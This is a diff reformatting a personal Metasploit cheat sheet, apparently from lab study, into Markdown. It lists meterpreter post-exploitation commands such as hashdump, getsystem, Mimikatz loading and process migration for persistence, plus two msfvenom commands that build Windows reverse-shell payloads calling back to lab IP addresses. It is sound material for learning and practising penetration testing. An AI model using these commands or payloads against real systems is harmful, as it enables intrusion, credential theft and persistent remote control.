@@ -1,107 +1,198 @@
-==================================
-| Main process to use MetaSploit |
-==================================
+# Metasploit Command Syntax
 
-search 		-> To look for a module to use
-use 		-> To load the module
-options 	-> To view any options you need to set
-set <options> 	-> Set the specified option
-run 		-> Run the exploit
+<p align="center"><img alt="Metasploit Logo" src="https://miro.medium.com/v2/resize:fit:1400/1*waFDh88WH0YeIK3xMP6TjA.png" width=500 /></p>
 
-==========================
-| Other usefull commands |
-==========================
+However, with many different commands and terminals this can become quite difficult and time consuming. 
 
-:: Channels
+</br>
 
+## Main commands to use MetaSploit
 
-:: Information gathering
-getuid						-> Get the current user
-getprivs					-> Get the priveleges for the current user
-sysinfo						-> Get info on the system
+```
+search                 > Look for a module to use
+use                    > Load the specific module
+options                > View any options you need to set
+set <options>          > Set the specified option
+run                    > Run the exploit
+exploit                > Run the exploit
+```
 
-:: Kiwi/Mimikatz can be loaded into the session
-load kiwi					-> help now shows more commands
+<br>
 
-:: Menu, go back to from session
+## Other usefull commands
+
+> [!NOTE]
+> Some of these commands can only be used after a (meterpreter) shell has been made to another machine. These will be marked with a 💲. Others must be used outside of these shells.
+
+#### 💲 Information gathering
+
+```
+getuid                 > Get the current user
+getprivs               > Get the priveleges for the current user
+sysinfo                > Get info on the system
+```
+
+#### 💲 Kiwi/Mimikatz can be loaded into the session
+
+```
+load kiwi              > help now shows more commands
+```
+
+#### 💲 Menu, go back to from session
+
+```
 background
+```
 
-:: Move/migrate to another process (for priveleges)
+#### 💲 Move/migrate to another process (for priveleges)
+
+```
 migrate -N <process name>
+```
 
-:: Passwords
-hashdump					-> Dumps all the hashes available on a computer when the required priveleges are met.
+#### 💲 Passwords
 
-:: Payloads
-show payloads					-> When a module is selected it will list compatible payloads
-set payload <id>				-> Selects the listed payload with the corresponding number.
-set payload <name>				-> Selects the payload with the corresponding name.
+```
+hashdump                > Dumps all the hashes available on a computer when the required priveleges are met.
+```
 
-:: Privelege escalataion (for Windows at least)
-getsystem 					-> when in a meterpreter session
+#### Payloads
 
-:: Quiting or closing a session
+```
+show payloads           > When a module is selected it will list compatible payloads
+set payload <id>        > Selects the listed payload with the corresponding number.
+set payload <name>      > Selects the payload with the corresponding name.
+```
+
+#### 💲 Privelege escalataion (for Windows at least)
+
+```
+getsystem               > when in a meterpreter session
+```
+
+#### 💲 Quiting or closing a session
+
+```
 quit 				
+```
 
-:: Search exploits
-use post/multi/recon/local_exploit_suggester 	-> Can be used to find any vulnerabilities on the system. Does need an active session.
+#### Search exploits
 
-:: Searching for modules
+```
+use post/multi/recon/local_exploit_suggester        > Can be used to find any vulnerabilities on the system. Does need an active session.
+```
+
+#### Searching for modules
+
+```
 search <keyword 1> <kayword 2> ...
+```
 
-:: Sessions
-sessions 					-> show all
-sessions -i <id> 				-> select and go to session
-sessions -u 					-> upgrade shel to meterpreter shell
-sessions -k <id>				-> kill selected session
+#### Sessions
 
-:: Shel creation after exploiting
-shell
+```
+sessions                > show all
+sessions -i <id>        > select and go to session
+sessions -u             > upgrade shel to meterpreter shell
+sessions -k <id>        > kill selected session
+```
 
-:: Shell conversion to Meterpreter
-post/multi/manage/shell_to_meterpreter		-> Converts a regular shell to a meterpreter session
+#### 💲 Shell creation after exploiting
 
-:: Show various possibilities (payloads/exploits etc.)
-show payloads
-show exploits
-show -h
+```
+shell                             > 
+```
 
-=====================
-| Metasploit Module |
-=====================
+#### Shell conversion to Meterpreter
 
-run post/windows/manage/migrate 
--> Run the migrate module that can be used to inject into another process to create persistence
+```
+post/multi/manage/shell_to_meterpreter          > Converts a regular shell to a meterpreter session
+```
 
+#### Show various possibilities (payloads/exploits etc.)
 
-=====================
-| MSFVenom Commands |
-=====================
+```
+show payloads                      > show payloads
+show exploits                      > show exploits
+show -h                            > show help
+```
 
+## Metasploit Module
+
+Some usefull modules that can be used in Metasploit.
+
+```
+run post/windows/manage/migrate
+> Run the migrate module that can be used to inject into another process to create persistence
+```
+
+<br>
+
+##  MSFVenom Commands
+
+```
 msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.18.78.136 LPORT=443 -b '\x0a\x0d\x00' -f c
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
+```
 
-msfvenom -l / --list formats			-> Show all available formats
-msfvenom -l / --list payloads			-> Show all available payloads
-msfvenom -e					-> Specifies the encoding format
-msfvenom -f					-> Specifies the output format (extension)
-msfvenom -o					-> Specifies the output location
+🔰 msfvenom argument | ℹ️ Function
+-- | --
+**`-l / --list formats`** | Show all available formats
+**`-l / --list payloads`** | Show all available payloads
+**`-e`** | Specifies the encoding format
+**`-f`** | Specifies the output format (extension)
+**`-o`** | Specifies the output location
 
-=======================
-| Database/workspaces |
-=======================
+<br>
 
-:: Outside of Metasploit
-systemctl start postgresql			-> Start postgreSQL used by Metasploit
-sudo msfdb init					-> start Metasploit database
+## Database/workspaces
 
-:: Inside metasploit
-db_status					-> Check database status
+#### Outside of Metasploit
 
-:: Workspaces
-workspace					-> List workspaces
-workspace -a tryhackme				-> Add workspace
-workspace default				-> Select workspace
+```
+systemctl start postgresql      > Start postgreSQL used by Metasploit
+sudo msfdb init                 > start Metasploit database
+```
 
-set hosts -R					-> Settings an RHOSTS options as the one stored in the database
+#### Inside metasploit
+
+```
+db_status                       > Check database status
+```
+
+#### Workspaces
+
+```
+workspace                       > List workspaces
+workspace -a tryhackme          > Add workspace
+workspace default               > Select workspace
+```
+
+```
+set hosts -R                    > Setting an RHOSTS options as the one stored in the database
+```
+
+
+
+<!--- 
+
+💲 ❕ ➡️
+
+## TITLE
+
+### Usefull documentation
+
+🔰 Name | ℹ️ Description | 🔗 Link
+-- | -- | --
+**** |  | 
+
+### Related tools
+
+🔰 Name | ℹ️ Description | 🔗 Link
+-- | -- | --
+**** |  | 
+
+<br>
+
+--->
